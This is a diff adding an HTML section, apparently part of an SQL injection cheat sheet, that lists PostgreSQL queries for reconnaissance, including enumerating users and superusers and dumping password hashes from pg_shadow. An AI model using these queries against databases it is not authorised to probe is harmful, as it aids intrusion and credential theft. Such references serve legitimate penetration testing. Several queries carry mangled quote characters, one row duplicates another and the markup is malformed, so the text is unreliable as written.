@@ -1,0 +1,99 @@
+<h3 id="information-gathering">Information Gathering</h3>
+
+<p class="pageDescription">{{site.data.injectionDescriptions.informationGathering}}</p>
+
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Version</td>
+      <td>SELECT version();</td>
+    </tr>
+    <tr>
+      <td>User</td>
+      <td>
+	  SELECT user;<br>
+	  SELECT current_user;<br>
+	  SELECT session_user;<br>
+	  SELECT usename FROM pg_user;<br>
+	  SELECT getpgusername();
+	  </td>
+    </tr>
+    <tr>
+      <td>Users</td>
+      <td>SELECT usename FROM pg_user</td>
+    </tr>
+    <tr>
+      <td>User Password Hashes</td>
+      <td>SELECT usename, passwd FROM pg_shadow</td>
+    </tr>	
+	<tr>
+      <td>Privileges</td>
+      <td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
+    </tr>
+	<tr>
+      <td>List DBA Accounts</td>
+      <td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
+    </tr>	
+	<tr>
+      <td>Current Database</td>
+      <td>SELECT current_database()</td>
+    </tr>	
+    <tr>
+      <td>Databases</td>
+      <td>SELECT datname FROM pg_database</td>
+    </tr>
+    <tr>	
+    <tr>
+      <td>Tables</td>
+      <td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
+    </tr>
+    <tr>
+      <td>Tables from Column Names</td>
+      <td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
+    </tr>	
+    <tr>
+      <td>Columns</td>
+      <td>SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td>
+    </tr>	
+    <tr>	
+      <td>Find Stored Procedures</td>
+      <td>
+		SELECT  proname <br>
+		FROM    pg_catalog.pg_namespace n <br>
+		JOIN    pg_catalog.pg_proc p <br>
+		ON      pronamespace = n.oid <br>
+		WHERE   nspname = 'public'; <br>
+	  </td>
+    </tr>	
+    <tr>
+		<td>Comments</td>
+		SELECT 1; –comment<Br>
+		SELECT /*comment*/1;<br>
+		</td>
+    </tr>		
+    </tr>
+    <tr>
+      <td>Server Name</td>
+      <td></td>
+    </tr>
+    <tr>
+      <td>Host Name</td>
+      <td>select inet_server_addr()</td>
+    </tr>		
+    <tr>
+    <tr>
+      <td>Listening Port</td>
+      <td>select inet_server_port();</td>
+    </tr>		
+    <tr>
+      <td>List Settings</td>
+      <td>SELECT * FROM pg_settings;</td>
+    </tr>			 
+  </tbody>
+</table>
